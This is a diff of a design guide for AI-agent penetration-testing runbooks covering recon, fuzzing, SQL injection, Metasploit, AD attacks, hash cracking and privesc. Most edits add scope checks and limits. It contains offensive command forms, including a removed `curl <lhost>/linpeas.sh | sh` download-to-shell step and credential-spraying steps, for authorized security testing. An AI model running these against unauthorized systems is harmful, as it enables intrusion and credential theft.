@@ -15,9 +15,8 @@
 > confirmed **once per engagement** in `<root>/<engagement>/scope.json` (see `AGENTS.md`); skills inherit
 > it and never re-confirm per run.
 >
-> **Researched:** Oct 2026 meta — the ProjectDiscovery suite dominates recon, `netexec` replaced
-> `crackmapexec`, BloodHound CE is default, and `ffuf`/`feroxbuster` are preferred over legacy
-> `dirb`/`dirbuster`.
+> **Design basis:** goal-driven selection, bounded profiles and actual native evidence. Tool-specific
+> defaults live in the owning runbooks; researched sources/rationale are linked in §5.14.
 
 ---
 
@@ -38,9 +37,9 @@
 - **One concern per skill.** Prefer `nuclei`, `ffuf`, `sqlmap` as separate skills over one `web.md`.
 - **The body is a runbook, not an essay** — exact command forms, decision points, output locations,
   and what to do with the results.
-- **Self-contained but cross-referenceable.** If skill A usually feeds skill B
-  (`subfinder` → `httpx` → `nuclei`), name the downstream skill so the agent chains them. Each skill
-  must also work standalone, without the `.claude/agents/` layer.
+- **One task, useful handback.** Name proposed downstream work only as a coordinator handoff. A
+  worker reads the selected runbook in its existing context, not another Skill/Agent fork. Direct
+  invocation uses the same canonical owner; do not preload every skill or encode compulsory chains.
 
 ---
 
@@ -58,8 +57,9 @@ description: >                    # TRIGGER TEXT — "Use when <task>, with <too
 arguments: "<positional args>"    # required first, optional in [brackets]; keep to <= 3-4
 model: inherit                    # ALWAYS 'inherit' (see §4) — never hardcode sonnet/opus/haiku/default
 effort: low | medium | high       # by weight (see §4)
-context: inline | fork            # 'fork' runs the body in a forked subagent
-agent: <subagent-name>            # only when context: fork (e.g. Explore, general-purpose)
+context: fork                    # direct invocation selects the canonical worker
+agent: <owner>                   # exact role from AGENTS.md ownership table
+background: false               # no dependent work before terminal handback
 category: recon | web | access | ad-network | privesc-creds | re-forensics | meta
 domain:   web | ad | network | host | crypto | binary | forensics | misc
 ---
@@ -72,8 +72,9 @@ domain:   web | ad | network | host | crypto | binary | forensics | misc
 | `arguments` | Positional args | Required first, optional in `[brackets]`. Keep ≤ 3–4; everything else is a flag the body sets. |
 | `model` | Model override | **Always `inherit`** — use the session model, never hardcode a name (see §4). |
 | `effort` | Reasoning budget | Scale to how much *judgement* the task needs, not runtime (see §4). |
-| `context` | Inline vs forked | `fork` for long fan-out / noisy output you don't want in the main thread. |
-| `agent` | Subagent to fork into | Only with `context: fork`. Match its tool access to the job. |
+| `context` | Direct invocation routing | `fork`; a worker Read/executes without forking again. |
+| `agent` | Canonical owner | Exact role from AGENTS.md, not Explore/general-purpose. |
+| `background` | Awaited execution | `false`; late writes cannot feed dependent tasks. |
 | `category` | Function group | One of the seven in §4; drives `docs/catalog.md` "By function". |
 | `domain` | Target surface | One of the eight in §4; drives `docs/catalog.md` "By domain". |
 
@@ -95,8 +96,9 @@ is **not** restated in it. Sections, in order:
   "never write under skills/"). Do not re-state any of it.
 - **`## Goal`** — what a successful run produces and why you'd reach for it (1–2 sentences).
 - **`## Steps`** — numbered, executable: helper init, scope-check, helper-wrapped original command
-  forms, decisions, triage, and finish. Preserve empty-result markers; the helper renders findings.md
-  and writes run.json/events.jsonl. GUI steps save exports and marker events, not fake commands.
+  forms with finite native/helper budgets, decisions, triage and finish. Declare the actual profile
+  and notes/task.md. Preserve native empty outputs unchanged; evidence/analysis proves results, not
+  marker pollution. GUI steps save exports/events; review uses its locked writer exception.
 - **`## Modern tooling & alternatives`** — current best-in-class, notable flags, legacy tools replaced.
 - **`## Checklist`** — fenced YAML; the verification contract (spec in §8). First item is always the
   inherited `scope-confirmed` gate.
@@ -119,10 +121,10 @@ the lifecycle in AGENTS.md. Real network tools are not required for the helper's
 |---|---|
 | `scope-init --engagement S --authorized-by WHO --target T --confirmed` | Records explicit user authorization once; repeat target; optional note/force. Force requires user-approved replacement. |
 | `scope-check --engagement S [--target T] [--targets-file FILE] [--run-dir DIR]` | Checks authorization and every endpoint; exits 0/2/3. With run-dir, denied checks write error handback. |
-| `init --engagement S --skill NAME [--target T] [--run-dir DIR]` | Creates isolated partial record, events, raw log, and rendered findings; honors OTUS_RUN_DIR. |
-| `run --run-dir DIR [--target T] [--targets-file FILE] [--label L] -- CMD...` | Rechecks scope, closes stdin, captures raw combined output, records start/exit, returns original exit code. |
+| `init --engagement S --skill NAME [--profile P] [--coverage-set C]` | Creates isolated partial record/events/raw log/findings; existing target/run-dir options remain. |
+| `run --run-dir DIR [scope options] --timeout N --grace G [--outcome-policy P] -- CMD...` | Bounded process-group execution, raw capture and actual child/helper outcome metadata; policy in AGENTS.md. |
 | `event --run-dir DIR --event marker --note M` | Records actual manual work; guardrail_stop with block/request-id finalizes the required stop handback. |
-| `finish --run-dir DIR --status STATUS --summary S` | Finalizes records and renders findings; repeat item/finding/error/completed/artifact/resolution flags as needed. |
+| `finish --run-dir DIR --status STATUS --summary S [--observed N] [--omitted O] [--stop-reason R]` | Finalizes actual task/coverage; repeated item/finding/handback flags and profile/set updates remain available. |
 | `archive --engagement S [--out FILE]` | Creates a private tar.gz outside the engagement; refuses overwrite, symlinks, and recursive self-inclusion. |
 
 `finish` accepts `--item 'id=ok|fail:evidence'` and
@@ -160,7 +162,36 @@ an unfinished partial record is never promoted to complete.
 Verification: `python3 -I scripts/test-otus-log.py` uses synthetic fixtures/temp directories,
 covering scope gates, failures/signals, raw output, ordering, escaping, archive restoration, and
 skill/agent wiring. After a contract or routing edit, run `python3 -I scripts/build-runtimes.py`;
-the first generation changes adapters, and a second generation must produce no additional diff.
+the first generation changes contracts/coordinator, and a second generation must produce no additional diff.
+
+### 3.2 Runtime discovery and startup acceptance
+
+Use offline read-only setup checks before an engagement; these are not skill runs and create no scope
+or engagement evidence. Check installed runtime/extension versions and supported native discovery,
+then actual role registration, parent agent tool, skill frontmatter and resolved worker capabilities.
+Supported VS Code can load `.claude/agents/*.md` directly; absence of duplicated `.github` worker files
+is not proof of failure. The generated `.github/agents/otus.agent.md` is the coordinator entrypoint.
+
+1. Refresh discovery using the installed runtime's supported UI/diagnostics. Confirm all 26 skill
+  names and exact four worker names, not merely files. Verify the coordinator's agent tool/allowlist.
+2. Invoke each exact named role with an offline-read-only setup task: read its definition/contract,
+  return registered identity and actual available tools, no shell/targets/writes/delegation. At most
+  two independent checks concurrently. Missing role/delegation controls -> setup failure, no fallback.
+3. Reviewer must resolve no execution. Reporter encode/concat/measure permissions must be enforced,
+  not inferred from `Bash(pattern)` strings; broad or absent execution cannot pass assembly acceptance.
+  Check assigned verdict creation and any required replacement separately: create-only Write cannot
+  update an existing verdict. Extra resolved tools must be disclosed; aliases are not a filesystem
+  or child-delegation sandbox, and do not authorize use beyond the role contract.
+4. In an isolated synthetic/temp-root test (no security tools or real targets), check terminal
+  execution -> exact reviewer verdict artifact -> reporter compilation -> independent report review.
+  Inspect actual outputs/handbacks; don't promote a startup echo or mocked run as completed acceptance.
+5. If a stage is unavailable, disclose the precise gap and stop that stage without changing tools,
+  permission modes or settings. Recheck named roles after user-driven supported setup changes.
+
+Local setup observation: VS Code 1.140.0 / Copilot 0.68.0 launched all four exact roles by named calls;
+no separate registration diagnostic was exposed. Reviewer had no execution and create-only verdict
+writing; reporter had no shell, so report assembly/end-to-end acceptance remains blocked.
+This is a tested-harness limitation, not a portable minimum version or an instruction to widen tools.
 
 ---
 
@@ -183,7 +214,8 @@ Portability rule: **nothing hardcodes a model name** that may not exist in anoth
 
   **Agents:** `recon-runner` → low · `vuln-hunter` → medium · `reviewer` → high · `reporter` → medium.
 
-- Leave `context:` and `agent:` unchanged when normalizing.
+- Match `context: fork`, `agent` and foreground handback to the canonical routing, not old generic
+  catalog defaults. Runtime metadata support must be checked; prose/frontmatter alone is not enforcement.
 
 **`category` / `domain` assignment** (one each, from the skill's real target):
 
@@ -208,32 +240,34 @@ misc. Do **not** add any ATT&CK/MITRE field to frontmatter.
 
 ## 5. Tool catalog — bug bounty & CTF/HTB
 
-Organized by phase. **Tier-1** tools (worth their own dedicated skill) get the full treatment.
-**Companion** tools are tabled at the end of each phase — they usually belong *inside* a parent skill.
-Defaults shown as `effort · context · agent`.
+Organized by capability, not a compulsory phase sequence. Examples below are selected initial argv;
+the owning runbook is authoritative for current version/profile, helper caps, evidence and finish.
+Broad/deep variants are conditional escalations requiring a lead or explicit coverage objective.
+Companions run only inside a selected worker task, not new implicit skills/delegates. Metadata uses
+`effort · fork · canonical-owner`; the ownership table itself lives only in AGENTS.md.
 
 ### 5.1 Reconnaissance & subdomain enumeration
 
-#### `subfinder` — passive subdomain discovery `low · fork · Explore`
-- **Goal:** Fast, passive list of subdomains for an in-scope apex domain, as the first stage of attack-surface mapping.
-- **Steps:** (1) confirm apex in scope → (2) `subfinder -d target.com -all -recursive -silent -o subs.txt` → (3) de-dupe/merge with other sources (`amass`, `assetfinder`, crt.sh) via `anew` → (4) hand `subs.txt` to `dnsx`/`httpx`.
+#### `subfinder` — passive subdomain discovery `low · fork · recon-runner`
+- **Goal:** A bounded passive list for a relevant apex-domain objective; skip isolated internal IP/HTB discovery.
+- **Steps:** version/source preflight -> `subfinder -d "$domain" -silent -timeout 5 -max-time 1 -o subs.txt` (one native minute, helper 75 seconds) -> actual source coverage/clean deduplicated handoff. All-source/recursive/extra-tool merging needs a new lead/allocation.
 - **Modern tooling:** ProjectDiscovery standard; pair with `amass` (more thorough, slower) and `assetfinder`. Legacy `sublist3r` is largely superseded.
 - **Output formats:** plaintext list; `-oJ` for JSON lines.
 - **Notes:** Passive only — low noise, safe default. Rate-limit API sources via config.
 
-#### `httpx` — HTTP probing & fingerprinting `low · fork · Explore`
+#### `httpx` — HTTP probing & fingerprinting `low · fork · recon-runner`
 - **Goal:** From a host list, find which are live over HTTP(S) and capture title, status, tech, IP, CDN — the "what's actually reachable" filter.
-- **Steps:** (1) input `subs.txt`/resolved list → (2) `httpx -l subs.txt -title -tech-detect -status-code -ip -o live.txt` (add `-json` for structured) → (3) split interesting (200/redirects, juicy tech) → (4) feed `katana`/`nuclei`.
+- **Steps:** verify ProjectDiscovery binary/alias before contact -> explicit URL batch with `-json -threads 5 -rate-limit 10 -timeout 5 -retries 0 -no-fallback-scheme` (helper 60 seconds) -> derive clean scheme/port URLs -> <=3 goal-relevant page observations. No unchecked redirects or automatic crawler/scanner handoff.
 - **Modern tooling:** ProjectDiscovery `httpx` (not the Python `httpx` lib). Replaces `httprobe` + manual `curl` loops.
 - **Output formats:** plaintext / `-json` (JSONL with tech, status, title).
 - **Notes:** `-rate-limit` to stay polite; respect program rate rules.
 
-#### `nmap` (`port-scanner`) — port & service scanning `medium · inline`
+#### `nmap` (`port-scanner`) — port & service scanning `low · fork · recon-runner`
 - **Goal:** Enumerate open ports, services, and versions on a host; the backbone of every HTB box and network-scope recon.
-- **Steps:** (1) quick sweep `nmap -p- --min-rate 2000 -oA scans/allports target` → (2) targeted `nmap -sCV -p<found> -oA scans/detail target` → (3) run relevant NSE scripts per service → (4) branch to per-service skills (SMB, web, etc.).
-- **Modern tooling:** `nmap` remains standard; `rustscan`/`masscan`/`naabu` for fast initial port discovery then hand ports to nmap for `-sCV`. NSE for scripted checks.
+- **Steps:** selected `nmap -sT --top-ports 100 -oA scans/initial "$target"` (helper 120 seconds), or supplied ports -> parse XML -> light `-sV --version-light` on useful open ports only. Remaining top-1000/full TCP is a recorded lead-driven escalation in finite chunks, not a first task; selected NSE is separately bounded.
+- **Modern tooling:** Nmap is the baseline; faster scanners are alternatives for a justified coverage need, not an extra mandatory pass.
 - **Output formats:** `-oA` emits normal/greppable/XML at once; XML → `searchsploit --nmap` and reporting.
-- **Notes:** `-p-` is slow — pair with a fast scanner. Avoid intrusive NSE categories unless authorized.
+- **Notes:** No forced minimum rate. Host-timeout may discard port tables; XML native accounting distinguishes filtered/down/skipped from scanned negatives. Unselected TCP/UDP remain omitted.
 
 **Companion recon tools (bundle into the skills above):**
 
@@ -250,13 +284,13 @@ Defaults shown as `effort · context · agent`.
 
 ### 5.2 Content discovery & fuzzing
 
-#### `ffuf` — web fuzzer (dirs, files, params, vhosts) `medium · fork · general-purpose`
+#### `ffuf` — web fuzzer (dirs, files, params, vhosts) `low · fork · recon-runner`
 - **Goal:** Discover hidden paths, files, parameters, and virtual hosts on a web target.
-- **Steps:** (1) pick wordlist by context → (2) dir: `ffuf -u https://t/FUZZ -w <wordlist> -mc 200,301,302,401,403 -o ffuf.json -of json` → (3) param: `-u 'https://t/page?FUZZ=1'`; vhost: fuzz `Host:` header → (4) filter noise with `-fc/-fs/-fw` after a calibration run → (5) feed findings to manual/Burp or vuln skills.
+- **Steps:** map known pages/three distinct invalid controls -> <=100 contextual entries with `-t 5 -rate 10 -timeout 3 -maxtime 15 -noninteractive -se -mc all -of json` (helper 35 seconds) -> native coverage/health -> <=3 candidate comparisons. Only healthy useful progress justifies <=400 additional entries/45 native seconds; larger/recursive/vhost modes are new tasks with checked endpoints.
 - **Modern tooling:** `ffuf` and `feroxbuster` are the current standard; `gobuster` still common. Legacy `dirb`/`dirbuster`/`wfuzz` superseded.
 - **Output formats:** `-of json|csv|html|md`; default stdout.
 - **RAG / cross-skill:** **Heavily wordlist-driven** — see §7 (SecLists). Feeds vuln skills (LFI, upload, IDOR) and Burp.
-- **Notes:** Always calibrate filters against a known-bad response to kill false positives; honour rate limits.
+- **Notes:** Preserve empty JSON; `-se` is not an aggregate error-rate check. Record unfinished native budgets as partial and update metadata to actual pilot/followup sets.
 
 **Companion discovery tools:**
 
@@ -269,10 +303,10 @@ Defaults shown as `effort · context · agent`.
 
 ### 5.3 Vulnerability scanning
 
-#### `nuclei` — template-based vulnerability scanner `high · fork · general-purpose`
+#### `nuclei` — template-based vulnerability scanner `medium · fork · vuln-hunter`
 - **Goal:** Scalable, low-false-positive detection of known CVEs, misconfigs, exposures, and takeovers across many hosts using community + custom templates.
-- **Steps:** (1) `nuclei -update-templates` → (2) `nuclei -l live.txt -severity critical,high,medium -o nuclei.txt` (or `-json`) → (3) narrow with `-tags cve,takeover,exposure` or specific `-t` paths → (4) **triage**: verify each hit manually, discard noise → (5) escalate confirmed findings to exploitation/report.
-- **Modern tooling:** *The* 2025–2026 scanner. Templates in `~/nuclei-templates` + `/usr/share/nuclei-templates`. Write custom templates for program-specific checks.
+- **Steps:** verified cached <=20 relevant template paths, no per-target update/clone -> `-c 2 -bs 1 -rate-limit 10 -timeout 5 -retries 0 -mhe 5 -dr -ni -duc -jsonl` (helper 180 seconds) -> native skip/health assessment -> minimum verification/triage. No code/headless/DoS/brute/fuzz or unchecked OOB defaults.
+- **Modern tooling:** Use reviewed compatible template caches; updates are separate setup work.
 - **Output formats:** plaintext; `-json`/`-jsonl` for pipelines; `-markdown-export` for reports.
 - **RAG / cross-skill:** **Strong RAG fit** — index the template library + CVE notes. Consumes `httpx` live list; feeds manual verification and reporting.
 - **Notes:** `-rate-limit` / `-c` concurrency to stay in bounds. Triage is mandatory — never report raw nuclei output.
@@ -287,26 +321,26 @@ Defaults shown as `effort · context · agent`.
 
 ### 5.4 Manual web testing & exploitation
 
-#### `sqlmap` — SQL injection detection & exploitation `high · inline`
+#### `sqlmap` — SQL injection detection & exploitation `medium · fork · vuln-hunter`
 - **Goal:** Confirm and exploit SQLi, then extract data / escalate (DBMS fingerprint, dump, read files, shell) on an authorized target.
-- **Steps:** (1) capture request (Burp "save item" / `-r req.txt`) → (2) `sqlmap -r req.txt --batch --level 3 --risk 2` → (3) if injectable, enumerate `--dbs`→`--tables`→`--dump` only what's needed → (4) advanced: `--os-shell`, `--file-read`, technique tuning (`--technique`, `--tamper`) → (5) record payloads for the report.
+- **Steps:** stable captured request/selected parameter -> `sqlmap -r "$REQ" -p "$PARAM" --batch --level 1 --risk 1 --threads 1 --timeout 5 --retries 0 --ignore-redirects --output-dir "$RUN/sqlmap-output"` (helper 120 seconds) -> actual traffic/confirmation. Data enumeration/extraction, higher risk/level or OS/file/tamper actions are separate justified tasks, not checklist requirements.
 - **Modern tooling:** `sqlmap` still standard for automated SQLi; `ghauri` is a faster newer alternative. For manual blind SQLi, hand-crafted payloads + Burp.
 - **Output formats:** CLI tables; session/logs under `~/.local/share/sqlmap/output/<host>/`; `--dump-format=csv`.
 - **RAG / cross-skill:** Pairs with a SQLi payload/tamper RAG (PayloadsAllTheThings). Input often from `ffuf`/Burp-found params. **Banned in OSCP exam** — note that in the body if relevant.
 - **Notes:** `--batch` for non-interactive; cap `--level/--risk`; **never** `--dump` entire DBs by default — minimise data pulled.
 
-#### `burpsuite` — intercepting proxy & web testing platform `high · inline`
+#### `burpsuite` — intercepting proxy & web testing platform `medium · fork · vuln-hunter`
 - **Goal:** Manually intercept, inspect, modify, and replay HTTP(S); the hub for authz testing, Repeater-driven exploitation, and Intruder fuzzing.
-- **Steps:** (1) set scope to in-scope hosts only → (2) proxy + crawl to map the app → (3) send interesting requests to Repeater; test IDOR/authz/logic → (4) Intruder for targeted fuzzing; Decoder/Comparer as needed → (5) export findings.
+- **Steps:** one mapping/replay/export hypothesis, 300-second task -> actual scope-restricted GUI observations/controlled Repeater cases -> raw exports/events. No broad crawler/Intruder ladder; unavailable GUI means partial/manual handback, not invented work.
 - **Modern tooling:** Burp Suite (Pro for active scan/extensions; Community for manual). `Caido` is a fast-growing lighter alternative; OWASP `ZAP` is the open-source option.
 - **Output formats:** Burp project file; exported report (HTML/XML); copied requests.
 - **Notes:** GUI tool — the skill is mostly a *methodology checklist* plus request/response handling, rather than a single command.
 
 ### 5.5 Exploitation frameworks & exploit lookup
 
-#### `metasploit` (`msfconsole`) — exploitation framework `high · inline`
+#### `metasploit` (`msfconsole`) — exploitation framework `medium · fork · vuln-hunter`
 - **Goal:** Select/configure/run exploit or auxiliary modules, deliver payloads, and manage sessions/post-exploitation.
-- **Steps:** (1) `msfconsole -q` → (2) `search <service/cve>` → pick module → (3) `use` → `set RHOSTS/LHOST/payload` → `check` where supported → (4) `run` → (5) on session: `sessions -i`, post modules, migrate, loot. Use one-shot `msfconsole -q -x "…; exit"` (see AGENTS.md non-interactive rule).
+- **Steps:** one matched module/options -> one-shot `msfconsole -q -x "use ...; set ...; check; exit"` (helper 120 seconds) -> inspect terminal check -> separate justified one-shot run/proof (<=120 seconds). No combined check/run, interactive session, migration or indefinite handler; unsupported check needs actual applicability evidence.
 - **Modern tooling:** Still the standard framework; for manual/OSCP-style work prefer single exploits from `searchsploit`/GitHub. `msfvenom` for payload generation.
 - **Output formats:** console; `spool` to log; loot/notes in the workspace DB (`db_export`).
 - **RAG / cross-skill:** `searchsploit`/ExploitDB + CVE notes as RAG for module selection. Consumes `nmap` service/version output. **Autopwn/browser_autopwn banned in OSCP** — note it.
@@ -323,17 +357,17 @@ Defaults shown as `effort · context · agent`.
 
 ### 5.6 Active Directory & lateral movement (HTB/OSCP core)
 
-#### `netexec` (`nxc`, formerly CrackMapExec) — network/AD swiss-army knife `high · inline`
+#### `netexec` (`nxc`, formerly CrackMapExec) — network/AD swiss-army knife `medium · fork · vuln-hunter`
 - **Goal:** Authenticate and enumerate/act across SMB/WinRM/LDAP/MSSQL/RDP at scale — spray creds, enumerate shares/users, run modules (LAPS, GPP, kerberoast), confirm access.
-- **Steps:** (1) `nxc smb <targets> -u user -p pass` (null/guest first) → (2) enumerate `--shares --users --rid-brute` → (3) protocol pivots (`ldap`, `winrm`, `mssql`) → (4) modules `-M <name>` (gpp_password, laps, kerberoast) → (5) feed creds/hashes to `impacket`/BloodHound.
+- **Steps:** selected known protocol/identity and checked endpoints -> serial auth/query with helper 60 seconds -> distinct credential/privilege/resource proof and actual/unknown lockout effects. Null/guest, RID, modules and protocol pivots are alternative lead-driven tasks; no compulsory ladder/spray.
 - **Modern tooling:** `netexec` is the maintained fork — use it over the retired `crackmapexec`.
 - **Output formats:** colorized CLI; loot DB under `~/.nxc/`; `--log` to file.
 - **RAG / cross-skill:** Feeds and is fed by BloodHound + impacket. A WADCOMS/AD-attack RAG maps "I have X → do Y".
 - **Notes:** Account lockout risk on spraying — check policy, throttle, prefer `--continue-on-success` deliberately.
 
-#### `bloodhound` (+ `bloodhound-python` / `SharpHound`) — AD attack-path analysis `high · inline`
+#### `bloodhound` (+ `bloodhound-python` / `SharpHound`) — AD attack-path analysis `medium · fork · vuln-hunter`
 - **Goal:** Collect AD objects and reveal privilege-escalation / lateral-movement paths to high-value targets (e.g. Domain Admin).
-- **Steps:** (1) collect: `bloodhound-python -u user -p pass -d domain -c All -ns <DC>` (or SharpHound on host) → (2) import JSON/zip into BloodHound CE → (3) run built-in + custom Cypher queries → (4) identify shortest path / abusable ACLs → (5) **re-collect as each new identity is gained — paths change**.
+- **Steps:** one AD hypothesis/supported compatible collector, targeted directory methods such as Group,ACL and checked DC/GC/DNS endpoints (helper 180 seconds) -> real objects/import receipt/query results -> candidate path, not exploitation proof. Recollection requires a recorded relevant topology/permission/membership change; no default All/session discovery.
 - **Modern tooling:** BloodHound **CE** (Community Edition) is current; collectors `bloodhound-python`, `SharpHound`, or `nxc --bloodhound`.
 - **Output formats:** JSON/zip collection; graph UI; Cypher query exports.
 - **RAG / cross-skill:** A Cypher-query RAG ("find kerberoastable", "DCSync rights") is very high-value. Consumes creds from `netexec`; feeds `impacket`/`certipy`/`rubeus` attacks.
@@ -351,13 +385,13 @@ Defaults shown as `effort · context · agent`.
 
 ### 5.7 Password attacks
 
-#### `hashcat` — GPU password/hash cracking `high · inline`
+#### `hashcat` — GPU password/hash cracking `medium · fork · vuln-hunter`
 - **Goal:** Recover plaintext from captured hashes to enable auth/lateral movement.
-- **Steps:** (1) identify hash type (`hashid` / `nth`) → map to `-m <mode>` → (2) `hashcat -m <mode> hashes.txt rockyou.txt` → (3) escalate: rules (`-r best64.rule`), masks (`-a 3 ?u?l?l?l?d`), combinator → (4) `--show` to list cracked → (5) feed creds back to AD/web skills.
+- **Steps:** provenance/source-confirmed mode/backend -> one finite contextual dictionary, native `--runtime 60 --status --status-json` (helper 90 seconds), isolated session/restore/pot/output -> actual status/exit/recovery assessment -> input/pot-only show. Rules/masks require a specific pattern/new finite task; no default ladder.
 - **Modern tooling:** `hashcat` (GPU) is primary; `john` for format coverage/CPU and jumbo scripts (`*2john`). `name-that-hash` for ID.
-- **Output formats:** potfile (`~/.hashcat/hashcat.potfile`); `--outfile cracked.txt`.
+- **Output formats:** private per-run pot/restore/outfile and native final JSON; no unrelated default-pot reuse.
 - **RAG / cross-skill:** A hash-mode lookup table + rules/mask cheat-sheet RAG saves time. Consumes hashes from `responder`/`secretsdump`/web dumps; feeds `netexec`/login skills.
-- **Notes:** Keep a wordlist+rules strategy ladder; don't brute blindly. `*2john` converters bridge many formats.
+- **Notes:** Only verified v6.2.6 direct argv supports expected-nonzero policy: exhaustion may recover hashes; native runtime is partial, unsupported/contradictory evidence stays strict error.
 
 **Companion password tools:**
 
@@ -381,11 +415,11 @@ Defaults shown as `effort · context · agent`.
 
 ### 5.9 Privilege escalation & post-exploitation
 
-#### `linpeas` / `winpeas` (PEASS-ng) — automated privesc enumeration `medium · inline`
+#### `linpeas` / `winpeas` (PEASS-ng) — automated privesc enumeration `medium · fork · vuln-hunter`
 - **Goal:** Surface likely local privilege-escalation vectors on a compromised host (SUID, caps, cron, creds, misconfigs, kernel).
-- **Steps:** (1) transfer (host over HTTP, `curl <lhost>/linpeas.sh | sh`) → (2) run, capture full output → (3) focus on red/yellow highlights → (4) cross-check vectors against GTFOBins/known CVEs → (5) exploit the most reliable path; keep a note of what was tried.
+- **Steps:** reuse/cheap selected host context -> PEASS only for an unresolved useful gap, reviewed staged artifact/remote-native cap/helper 180 seconds -> <=3 actual prerequisite cross-checks. No download-to-shell/default all-checks/remote output file; positive cleanup proof for staged artifacts. Return candidates, never execute privesc here.
 - **Modern tooling:** PEASS-ng `linpeas.sh` / `winPEASx64.exe`. Companions: `pspy` (process watch, no root), `linux-exploit-suggester`, `wesng` (Windows).
-- **Output formats:** colorized stdout; `-a` all checks; pipe/tee to a file for review.
+- **Output formats:** unchanged local raw stdout/context and separate vector/coverage analysis.
 - **RAG / cross-skill:** **GTFOBins + LOLBAS + HackTricks privesc = ideal RAG.** Runs after any initial foothold skill.
 - **Notes:** Noisy/slow — fine in labs, think twice in sensitive environments. Don't blindly run suggested exploits; verify first.
 
@@ -399,17 +433,17 @@ Defaults shown as `effort · context · agent`.
 
 ### 5.10 CTF — binary exploitation & reverse engineering
 
-#### `pwntools` — exploit development framework (Python) `max · inline`
+#### `pwntools` — exploit development framework (Python) `high · fork · vuln-hunter`
 - **Goal:** Script interaction with local/remote binaries and build working pwn exploits (I/O, packing, ROP, shellcode, format-string).
-- **Steps:** (1) `checksec` the binary (RELRO/NX/PIE/canary) → (2) `from pwn import *`; model I/O with `process()`/`remote()` → (3) find offset (cyclic), leak/defeat mitigations → (4) build ROP/shellcode payload (`ROP`, `shellcraft`) → (5) test local → fire remote → capture flag.
+- **Steps:** one reproducible local-first hypothesis, total task 300 seconds -> captured offsets/leaks/binary/libc facts -> finite script attempts with I/O deadlines and close -> conditional checked remote proof (helper 60 seconds). No debugger attachment/interactive/unbounded receive or automatic remote replay.
 - **Modern tooling:** `pwntools` + `gdb` with `pwndbg` or `GEF`; `ROPgadget`/`ropper`; `one_gadget`; `angr` for symbolic execution; `checksec`.
 - **Output formats:** the exploit script itself + captured flag; structured logs via `context.log_level`.
 - **RAG / cross-skill:** A pwn-technique RAG (ret2libc, ret2csu, ret2dlresolve, heap notes) + prior writeups is very useful. Pairs with `radare2`/`ghidra` for the static side.
 - **Notes:** Highest-reasoning skill class. Iterate local-first; keep offsets/leaks reproducible.
 
-#### `ghidra` — reverse engineering suite (decompiler) `xhigh · inline`
+#### `ghidra` — reverse engineering suite (decompiler) `high · fork · vuln-hunter`
 - **Goal:** Statically understand an unknown binary — decompile to C-like pseudocode, map logic, find the check/flag/vuln.
-- **Steps:** (1) import + auto-analyze → (2) locate `main`/entry and interesting funcs (strings/xrefs) → (3) read decompiled pseudocode, rename/annotate → (4) extract algorithm/constraints → (5) hand to `pwntools` (exploit) or `z3`/script (solve).
+- **Steps:** cheap triage/string/xref lead -> selected functions, native headless `-analysisTimeoutPerFile 240` below helper 300 seconds if needed -> actual log/project/logic exports cross-checked with disassembly. Directory existence is not analysis; native timeout can exit zero but remains partial.
 - **Modern tooling:** Ghidra (free, NSA) is the default decompiler; `IDA Free`, `Binary Ninja`, `radare2`/`Cutter`, `rizin` are alternatives. `strings`/`objdump`/`readelf`/`ltrace`/`strace` for quick triage.
 - **Output formats:** decompiled pseudocode, annotated project; exported C / notes.
 - **RAG / cross-skill:** RE-pattern RAG (common obfuscations, crypto constants, libc quirks). Feeds pwn/crypto solve skills.
@@ -428,16 +462,16 @@ Defaults shown as `effort · context · agent`.
 
 ### 5.11 CTF — forensics, stego & network
 
-#### `wireshark` / `tshark` — packet analysis `medium · inline`
+#### `wireshark` / `tshark` — packet analysis `medium · fork · vuln-hunter`
 - **Goal:** Extract secrets/flags/artifacts from a pcap — follow streams, carve files, decode protocols.
-- **Steps:** (1) open pcap → Statistics → Protocol Hierarchy → (2) filter (`http`, `ftp-data`, `dns`, `tcp.stream eq N`) → (3) Follow Stream / Export Objects to carve files → (4) decode/extract (creds, uploads, exfil) → (5) pivot to stego/crypto skills on carved data.
+- **Steps:** offline protocol sample with `tshark -n -c 10000` (helper 60 seconds, task 120) -> <=3 selected streams/artifacts -> actual filtered subset before object export -> coverage/secret-free artifact refs. Preserve original PCAP; no assumed whole-capture negative or external name resolution.
 - **Modern tooling:** Wireshark GUI + `tshark` for scriptable/headless extraction; `tcpdump` to capture; `NetworkMiner` for artifact carving.
 - **Output formats:** carved files (Export Objects), `tshark -T fields/-T json` for structured, CSV.
 - **Notes:** Prefer `tshark` for automation inside a skill; huge pcaps → filter first.
 
-#### `binwalk` — firmware/file carving & analysis `low · inline`
+#### `binwalk` — firmware/file carving & analysis `medium · fork · vuln-hunter`
 - **Goal:** Detect and extract embedded/hidden files within a blob (firmware, image, odd file) — classic forensics/stego first move.
-- **Steps:** (1) `binwalk file` (signature scan) → (2) `binwalk -e file` (extract; `--dd` for specific types) → (3) recurse `-Me` if nested → (4) inspect carved output → (5) hand to RE/stego skills.
+- **Steps:** signature first (helper 60 seconds) -> selective credible container extraction only -> enforce actual <=2 layers/100 files/100 MiB before recursion -> inspect offsets/content without execution/path escapes. Unsupported enforcement means skip/disclose, not invented limit flags or unlimited recursion.
 - **Modern tooling:** `binwalk` (v3 Rust rewrite); companions `foremost`/`scalpel` (carving), `file`/`strings`, `bulk_extractor`.
 - **Output formats:** extraction dir `_<file>.extracted/`, signature report (stdout / log).
 - **Notes:** Extraction can spawn many files — work in a scratch dir.
@@ -473,6 +507,22 @@ Defaults shown as `effort · context · agent`.
 | `gf` + patterns | grep-powered pattern hunting over URLs/JS | txt | low · inline |
 | `LinkFinder` / `getJS` | Pull endpoints/secrets from JS | txt | low · fork |
 
+### 5.14 Researched choices and limits
+
+Otus borrows selective service-triggered routing from [AutoRecon](https://github.com/AutoRecon/AutoRecon),
+explicit modes/resume discipline from [reconFTW](https://github.com/six2dez/reconftw), and maintained
+reasoning/execution/result context from [PentestGPT](https://github.com/GreyDGL/PentestGPT).
+[OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/) informs risk/objective-led
+verification. These are design references, not imported exhaustive chains or benchmark guarantees.
+
+Version-specific checks informing these defaults: [Nmap timing](https://nmap.org/book/man-performance.html)
+(host timeout can discard results); [FFUF v2.1.0](https://github.com/ffuf/ffuf/tree/v2.1.0)
+(native timebox/flush and consecutive-error semantics); [Hashcat v6.2.6](https://github.com/hashcat/hashcat/tree/v6.2.6)
+(native status JSON and exit semantics). Flags/classifiers must still match installed help/source.
+[VS Code custom agents](https://code.visualstudio.com/docs/copilot/customization/custom-agents) and
